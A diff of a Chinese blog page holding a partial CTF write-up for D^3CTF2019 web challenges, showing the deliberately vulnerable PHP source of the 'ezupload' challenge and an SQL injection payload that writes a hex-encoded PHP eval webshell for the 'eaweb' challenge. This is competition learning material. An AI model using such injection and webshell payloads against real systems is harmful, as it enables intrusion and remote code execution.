@@ -1,4 +1,250 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> D^3CTF2019 WEB 部分题解 · Imtinmin的小站</title><meta name="description" content="D^3CTF2019 WEB 部分题解 - Imtinmin"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico?v=2018"><link rel="stylesheet" href="/css/style.css"><link rel="search" type="application/opensearchdescription+xml" href="http://imtinmin.github.io/atom.xml" title="Imtinmin的小站"><meta name="generator" content="Hexo 4.0.0"></head><body><div class="wrap"><header><h1 class="title">Imtinmin的小站</h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives/" target="_self">ARCHIVE</a></li><li class="nav-list-item"><a class="nav-list-link" href="/about" target="_self">ABOUT</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">D^3CTF2019 WEB 部分题解</h1><div class="post-info">2019-12-15</div><div class="post-content"><h1 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h1><p><a href="https://github.com/Lou00/d3ctf_2019_ezupload" target="_blank" rel="noopener">https://github.com/Lou00/d3ctf_2019_ezupload</a></p>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://imtinmin.github.io').hostname,
+    root: '/',
+    scheme: 'Muse',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="前言  没做出来题，下次加油">
+<meta name="keywords" content="WEB,HTTP-Smashing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D^3CTF2019 WEB 部分题解">
+<meta property="og:url" content="http:&#x2F;&#x2F;imtinmin.github.io&#x2F;2019&#x2F;12&#x2F;15&#x2F;2019-12-16-WP&#x2F;index.html">
+<meta property="og:site_name" content="Imtinmin的小站">
+<meta property="og:description" content="前言  没做出来题，下次加油">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;uploader.shimo.im&#x2F;f&#x2F;T4nAYWBozMYy8MpW.png!thumbnail">
+<meta property="og:image" content="https:&#x2F;&#x2F;uploader.shimo.im&#x2F;f&#x2F;qu84t0KE77kt49eG.png!thumbnail">
+<meta property="og:image" content="https:&#x2F;&#x2F;uploader.shimo.im&#x2F;f&#x2F;YwusToLzRLEm2SxO.png!thumbnail">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;12&#x2F;16&#x2F;uVsCtGqvy7ezZEF.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;uploader.shimo.im&#x2F;f&#x2F;0k95RxDZYTws9e7d.png!thumbnail">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;12&#x2F;22&#x2F;oZUsvFlMt1a7f5p.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;12&#x2F;22&#x2F;QAZGgPmcp5bNOS9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;12&#x2F;22&#x2F;foCFAlEyI7rwhmz.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;12&#x2F;16&#x2F;l5HVqGhyOz2gmBf.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;12&#x2F;16&#x2F;HagKQscYPTDE7kF.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;12&#x2F;16&#x2F;UXD1Euo2vIwdrBP.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;12&#x2F;16&#x2F;R42ckjwdTiAUGeQ.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;12&#x2F;16&#x2F;iXEcD1KHWkQm5jL.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;12&#x2F;16&#x2F;iXEcD1KHWkQm5jL.png">
+<meta property="og:updated_time" content="2019-12-22T13:12:55.649Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;uploader.shimo.im&#x2F;f&#x2F;T4nAYWBozMYy8MpW.png!thumbnail">
+
+<link rel="canonical" href="http://imtinmin.github.io/2019/12/15/2019-12-16-WP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>D^3CTF2019 WEB 部分题解 | Imtinmin的小站</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Imtinmin的小站</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://imtinmin.github.io/2019/12/15/2019-12-16-WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Imtinmin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Imtinmin的小站">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          D^3CTF2019 WEB 部分题解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-12-15 00:09:01" itemprop="dateCreated datePublished" datetime="2019-12-15T00:09:01+08:00">2019-12-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-12-22 21:12:55" itemprop="dateModified" datetime="2019-12-22T21:12:55+08:00">2019-12-22</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p> 没做出来题，下次加油</p>
+</blockquote>
+<a id="more"></a>
+
+<h1 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h1><p><a href="https://github.com/Lou00/d3ctf_2019_ezupload" target="_blank" rel="noopener">https://github.com/Lou00/d3ctf_2019_ezupload</a></p>
 <p>给了源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url,$filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename  =  $filename;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;userdir != <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $r = parse_url(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($r[<span class="string">'scheme'</span>]) || preg_match(<span class="string">"/file|php/i"</span>,$r[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'..'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'/'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = substr(<span class="keyword">$this</span>-&gt;filename, strrpos(<span class="keyword">$this</span>-&gt;filename, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/ph/i"</span>, $ext))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;url,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span>, $content))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename,$content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($dir === <span class="string">''</span>)&#123;</span><br><span class="line">            $num = count(scandir(<span class="keyword">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $num = count(scandir($dir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you have $num files"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you don't have file"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> implode(<span class="string">" "</span>,scandir(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">        <span class="keyword">echo</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="keyword">new</span> dir($_POST[<span class="string">'url'</span>],$_POST[<span class="string">'filename'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'action'</span>] === <span class="string">"upload"</span>) &#123;</span><br><span class="line">    $dir-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"remove"</span>) &#123;</span><br><span class="line">    $dir-&gt;remove();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"count"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'dir'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count(<span class="string">''</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count($_POST[<span class="string">'dir'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -89,4 +335,237 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; uni&#123;on sel&#123;ect 0x7b7b7068707d7d6576616c28245f4745545b315d293b7b7b2f7068707d7d#</span><br></pre></td></tr></table></figure>
 
 <h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>phar</p>
-</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2019/12/15/2019-12-15-WEB/">PREV</a><a class="next" href="/2019/12/05/2019-12-5-WEB/">NEXT</a></div><div class="copyright"><p>© 2019 PEACE & LOVE</p><p>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>, <a href="https://github.com/jeremyfan/hexo-theme-still" target="_blank">theme</a> by <a href="https://github.com/jeremyfan" target="_blank">Imtinmin</a>.</p></div></footer></div></body></html>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Imtinmin WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/WEB/" rel="tag"><i class="fa fa-tag"></i> WEB</a>
+              <a href="/tags/HTTP-Smashing/" rel="tag"><i class="fa fa-tag"></i> HTTP-Smashing</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/12/15/2019-12-15-WEB/" rel="prev" title="极客大挑战RCE ME">
+      <i class="fa fa-chevron-left"></i> 极客大挑战RCE ME
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/12/05/2019-12-5-WEB/" rel="next" title="ctf473831530_2019_yulige WP">
+      ctf473831530_2019_yulige WP <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezupload"><span class="nav-number">2.</span> <span class="nav-text">ezupload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#showhub"><span class="nav-number">3.</span> <span class="nav-text">showhub</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#insert-on-duplicate-key-update-注入"><span class="nav-number">3.0.1.</span> <span class="nav-text">insert on duplicate key update 注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#eaweb"><span class="nav-number">4.</span> <span class="nav-text">eaweb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#非预期解"><span class="nav-number">4.0.1.</span> <span class="nav-text">非预期解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预期解"><span class="nav-number">4.0.2.</span> <span class="nav-text">预期解</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Imtinmin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/imtinmin" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;imtinmin" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Imtinmin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
